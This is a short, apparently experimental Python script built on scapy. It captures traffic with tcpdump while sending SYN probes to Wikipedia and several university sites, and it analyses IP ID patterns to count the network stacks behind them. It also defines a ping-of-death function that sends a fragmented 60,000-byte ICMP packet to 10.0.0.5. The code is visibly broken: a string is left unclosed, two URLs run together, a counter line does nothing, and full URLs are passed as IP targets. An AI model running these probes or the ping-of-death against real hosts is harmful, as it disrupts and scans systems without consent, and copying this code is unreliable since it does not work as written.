from scapy.all import *
import requests
from matplotlib.pyplot import *
from scapy.utils import RawPcapReader
from scapy.layers.inet import *
import subprocess
import time

def process_pcap(file_name):
    print('Opening {}...'.format(file_name))

    count = 0
    for (pkt_data, pkt_metadata,) in RawPcapReader(file_name):
        count += 1

    print('{} contains {} packets'.format(file_name, count))


for i in range(0,10):
    destination_packet_size = []

    destination = [ 'https://en.wikipedia.org/wiki/Cat' , 'https://en.wikipedia.org/wiki/Dog', 'https://en.wikipedia.org/wiki/Egress_filtering,
                    'http://web.mit.edu/', 'http://www.unm.edu/', 'https://www.cmu.edu/','https://www.berkeley.edu/','https://www.utexas.edu/','https://www.asu.edu https://www.utdallas.edu/']
    k = 0
    for path in destination:
        p = subprocess.Popen(['tcpdump', '-I', '-i', 'en1',
                              '-w', path + str(k) + '.pcap'], stdout=subprocess.PIPE)
        len(IP(dst=destination)/TCP(dport=80))
        ans, unans = sr((IP(dst=destination)/TCP(dport=80)), flags="S")
        #ans.make_table(lambda(s,r): (s.dst, s.dport, r.sprintf("{TCP:%TCP.flags%}{ICMP:%IP.src% - %ICMP.type%}"))))
        ans.plot(lambda x: x[1].id)
        # IP ID patterns to know how many distinctt IP stacks are being used

        k + k + 1
        p.terminate()

def ping_of_death():
    send(fragment(IP(dst="10.0.0.5") / ICMP() / ("X" * 60000)))